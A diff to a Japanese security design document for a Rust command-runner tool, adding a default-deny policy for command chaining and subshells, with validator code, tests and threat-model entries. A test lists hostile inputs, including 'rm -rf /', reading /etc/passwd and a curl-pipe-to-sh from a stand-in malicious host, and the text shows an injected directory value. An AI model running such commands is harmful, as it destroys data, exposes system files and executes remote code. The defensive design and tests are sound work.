@@ -90,7 +90,305 @@ use shell_words::quote;
 let safe_arg = quote(user_input);
 ```
 
-## 4. 設定ファイルの検証
+## 4. コマンド連結のセキュリティ設計
+
+### 4.1 設計方針
+
+**デフォルト拒否（Secure by Default）**:
+```toml
+# デフォルト: コマンド連結（&&, ||, ;）は禁止
+[config]
+allow_command_chaining = false  # デフォルト値
+
+[commands.example]
+cmd = "echo hello && echo world"  # ❌ 拒否される
+```
+
+**理由**:
+1. **シェルインジェクションリスク**: `&&`, `||`, `;` は任意コマンドの連結を許可し、攻撃ベクトルとなる
+2. **外部入力の危険性**: 変数展開と組み合わせると、制御困難な実行パスが生成される
+3. **意図しない動作**: 先行コマンドの失敗が後続に影響する複雑な依存関係
+
+### 4.2 階層的制御メカニズム
+
+**3層の優先順位**:
+```rust
+// 1. コマンド個別設定（最優先）
+command.allow_chaining: Option<bool>
+
+// 2. グローバル設定
+config.allow_command_chaining: bool
+
+// 3. デフォルト（false）
+```
+
+**実装**:
+```rust
+fn build_validator_for_command(&self, command: &Command) -> CommandValidator {
+    // 優先順位: 個別 > グローバル > デフォルト(false)
+    let allow_chaining = command.allow_chaining
+        .unwrap_or(self.context.allow_command_chaining);
+
+    // コマンド連結を許可する場合、strictモード無効化が必要
+    // （[;&|] パターンが危険パターンとして検出されるため）
+    let effective_strict = if allow_chaining {
+        false
+    } else {
+        self.context.strict
+    };
+
+    let mut validator = if effective_strict {
+        CommandValidator::new().allow_variable_expansion()
+    } else {
+        CommandValidator::new()
+            .with_strict_mode(false)
+            .allow_variable_expansion()
+            .allow_pipe()
+            .allow_redirect()
+    };
+
+    if allow_chaining {
+        validator = validator.allow_chaining();
+    }
+
+    validator
+}
+```
+
+### 4.3 安全な代替方法（推奨）
+
+**コマンド配列による順次実行**:
+```toml
+# ✅ 推奨: 明示的な配列で安全性を保証
+[commands.build-and-deploy]
+cmd = [
+    "npm run build",
+    "npm run deploy"
+]
+# 各コマンドは独立して検証される
+# 先行コマンド失敗時は自動停止
+```
+
+**利点**:
+- 各コマンドが独立して検証される
+- シェルメタ文字の解釈を回避
+- 依存関係が明示的
+- テストが容易
+
+### 4.4 明示的な許可が必要な場合
+
+**個別コマンドでの許可（条件付き推奨）**:
+```toml
+[commands.git-diff]
+description = "変更を確認"
+cmd = "cd /path/to/project && git diff"
+allow_chaining = true  # このコマンドのみ許可
+```
+
+**使用条件**:
+1. コマンドが完全に静的（変数展開なし）
+2. 信頼できるパス・コマンドのみ
+3. 外部入力を一切含まない
+
+**危険な例**:
+```toml
+# ❌ 絶対禁止: 変数展開とコマンド連結の組み合わせ
+[commands.deploy]
+cmd = "cd ${DIR} && rm -rf *"  # シェルインジェクションリスク
+allow_chaining = true
+```
+
+### 4.5 グローバル許可（非推奨）
+
+```toml
+# ⚠️ 非推奨: 全コマンドでコマンド連結を許可
+[config]
+allow_command_chaining = true
+```
+
+**リスク**:
+- すべてのコマンドで `&&`, `||`, `;` が使用可能になる
+- 将来追加されるコマンドも自動的に許可される
+- コマンドごとの安全性評価が困難
+
+**許可する場合の条件**:
+- すべてのコマンドが信頼できる静的コマンドのみ
+- 外部入力を一切含まない環境
+- レガシーシェルスクリプトからの移行期間のみ
+
+### 4.6 セキュリティテスト
+
+**階層的制御の検証**:
+```rust
+#[tokio::test]
+async fn test_command_chaining_hierarchical_control() {
+    // 1. デフォルト拒否
+    let ctx_default = ExecutionContext {
+        allow_command_chaining: false,
+        ..Default::default()
+    };
+    let cmd_default = Command {
+        cmd: CommandSpec::Single("echo hello && echo world".to_string()),
+        allow_chaining: None,  // グローバル設定に従う
+        ..
+    };
+    assert!(executor.execute(&cmd_default).await.is_err());
+
+    // 2. 個別許可（グローバル拒否を上書き）
+    let cmd_individual = Command {
+        allow_chaining: Some(true),  // 個別で許可
+        ..
+    };
+    assert!(executor.execute(&cmd_individual).await.is_ok());
+
+    // 3. 個別拒否（グローバル許可を上書き）
+    let ctx_global_allow = ExecutionContext {
+        allow_command_chaining: true,
+        ..
+    };
+    let cmd_deny = Command {
+        allow_chaining: Some(false),  // 個別で拒否
+        ..
+    };
+    assert!(executor.execute(&cmd_deny).await.is_err());
+}
+```
+
+**インジェクション攻撃の防御確認**:
+```rust
+#[test]
+fn test_command_injection_with_chaining() {
+    let validator = CommandValidator::new();  // デフォルト: allow_chaining = false
+
+    let dangerous_commands = vec![
+        "ls; rm -rf /",
+        "echo hello && cat /etc/passwd",
+        "whoami || curl malicious.com/shell.sh | sh",
+    ];
+
+    for cmd in dangerous_commands {
+        assert!(!validator.validate(cmd).is_safe());
+    }
+}
+```
+
+### 4.7 ユーザーガイダンス
+
+**コマンド連結が拒否された場合のヒント**:
+```rust
+// i18n対応エラーメッセージ
+if let ValidationError::DangerousMetacharacters(chars) = err {
+    if chars.contains("'&'") || chars.contains("'|'") || chars.contains("';'") {
+        eprintln!("{}", get_message(MessageKey::HintCommandChainingAlternatives, language));
+        eprintln!("{}", get_message(MessageKey::HintCommandArrayRecommended, language));
+        eprintln!("{}", get_message(MessageKey::HintEnableChainingForCommand, language));
+        eprintln!("{}", get_message(MessageKey::HintEnableChainingGlobally, language));
+    }
+}
+```
+
+**出力例（日本語）**:
+```
+💡 ヒント: 次のいずれかの代替方法を使用してください：
+   1. コマンド配列を使用（セキュリティ上推奨）:
+      cmd = ["cd /path", "git diff"]
+
+   2. このコマンドのみ連結を許可（注意して使用）:
+      allow_chaining = true
+
+   3. グローバルで連結を許可（非推奨）:
+      [config]
+      allow_command_chaining = true
+```
+
+### 4.8 ベストプラクティス
+
+1. **コマンド配列を優先**: 可能な限り `cmd = ["cmd1", "cmd2"]` を使用
+2. **静的コマンドのみ**: 変数展開とコマンド連結を同時に使用しない
+3. **最小権限**: 必要なコマンドのみ個別に `allow_chaining = true` を設定
+4. **定期レビュー**: allow_chaining 使用箇所を定期的に監査
+5. **テスト**: 各コマンドで期待通りの動作を確認
+
+### 4.9 サブシェル制御（Phase 4拡張）
+
+**デフォルト拒否（Secure by Default）**:
+```toml
+# デフォルト: サブシェル（括弧）は禁止
+[config]
+allow_subshells = false  # デフォルト値
+
+[commands.grep-pattern]
+cmd = "grep -E '(ERROR|WARN)' app.log"  # ❌ 拒否される（括弧が禁止）
+```
+
+**設計根拠**:
+1. **セキュリティリスク**: サブシェル `()` は任意のコマンドグループ化を許可し、攻撃ベクトルとなる
+2. **正当な用途の限定**: grep正規表現パターン等、特定のユースケースでのみ必要
+3. **細粒度制御**: コマンド個別設定により、必要な箇所のみ許可
+
+**階層的制御メカニズム**:
+```rust
+// 優先順位: 個別 > グローバル > デフォルト(false)
+let allow_subshells = command.allow_subshells
+    .unwrap_or(self.context.allow_subshells);
+
+// サブシェル許可時はstrictモード無効化
+let effective_strict = if allow_chaining || allow_subshells {
+    false
+} else {
+    self.context.strict
+};
+
+if allow_subshells {
+    validator = validator.allow_subshells();
+}
+```
+
+**正当な使用例**:
+
+1. **grep正規表現パターン**:
+   ```toml
+   [commands.search-logs]
+   cmd = "grep -E '(ERROR|WARN|FATAL)' /var/log/app.log"
+   allow_subshells = true  # 正規表現パターンに括弧が必要
+   ```
+
+2. **コマンドグループ化**:
+   ```toml
+   [commands.build-in-temp]
+   cmd = "(cd /tmp && make) && echo Done"
+   allow_subshells = true  # サブシェル内で作業ディレクトリ変更
+   allow_chaining = true    # && も併用
+   ```
+
+**安全な代替方法（推奨）**:
+```toml
+# ✅ 推奨: コマンド配列で括弧を回避
+[commands.search-pattern]
+cmd = ["grep", "-E", "(ERROR|WARN)", "app.log"]
+# 配列形式では括弧がシェルメタ文字として解釈されない
+```
+
+**セキュリティガイドライン**:
+1. **正規表現パターンのみ**: grep等の正当な用途に限定
+2. **静的パターン**: 変数展開とサブシェルを同時に使用しない
+3. **最小権限**: 必要なコマンドのみ個別に `allow_subshells = true` を設定
+4. **監査**: allow_subshells 使用箇所を定期的にレビュー
+
+**エスケープシーケンスの許可**:
+```rust
+// Phase 4で改善: \n, \r, \t はセキュリティリスクがほぼゼロのため許可
+const DANGEROUS_METACHARACTERS: &'static [char] = &[
+    ';', '&', '|', '>', '<', '`', '$', '(', ')', '{', '}', '[', ']', '\\', '"', '\'',
+    // \n, \r, \t は除外（フォーマット出力に必要）
+];
+```
+
+**利点**:
+- フォーマット出力（`echo -e 'line1\nline2'`）が可能に
+- セキュリティリスクなし（文字列リテラル内でのみ使用）
+
+## 5. 設定ファイルの検証
 
 ### TOML パース時の検証
 ```rust
@@ -354,12 +652,17 @@ cargo deny check
 ### 実装時
 - [ ] 変数展開はホワイトリスト方式
 - [ ] シェルインジェクション対策
+- [ ] コマンド連結はデフォルト拒否（allow_chaining）
+- [ ] allow_chaining使用時は静的コマンドのみ
+- [ ] 変数展開とコマンド連結を同時使用しない
 - [ ] ディレクトリトラバーサル対策
 - [ ] 機密情報のマスク
 - [ ] リソース制限の実装
 
 ### テスト時
 - [ ] 悪意ある入力でのテスト
+- [ ] コマンド連結の階層的制御テスト
+- [ ] allow_chaining によるインジェクション対策テスト
 - [ ] 循環依存の検出テスト
 - [ ] タイムアウトのテスト
 - [ ] 権限エスカレーションのテスト
@@ -381,6 +684,15 @@ cargo deny check
 2. **シェルインジェクション**
    - 対策: 引数として渡す（シェル解釈を回避）
    - 対策: shell-words でエスケープ
+   - 対策: コマンド連結（&&, ||, ;）をデフォルト拒否
+
+2-1. **コマンド連結による攻撃**
+   - 脅威: `cmd = "cd ${USER_DIR} && rm -rf *"` のような変数展開とコマンド連結の組み合わせ
+   - 影響: USER_DIR に `/; echo malicious` を設定すると任意コマンド実行が可能
+   - 対策: デフォルトで &&, ||, ; を禁止（allow_chaining = false）
+   - 対策: 個別コマンドでの明示的な許可が必要
+   - 対策: 安全な代替としてコマンド配列 `cmd = ["cmd1", "cmd2"]` を推奨
+   - 対策: allow_chaining使用時は静的コマンドのみ許可
 
 3. **ディレクトリトラバーサル**
    - 対策: 絶対パス化と検証
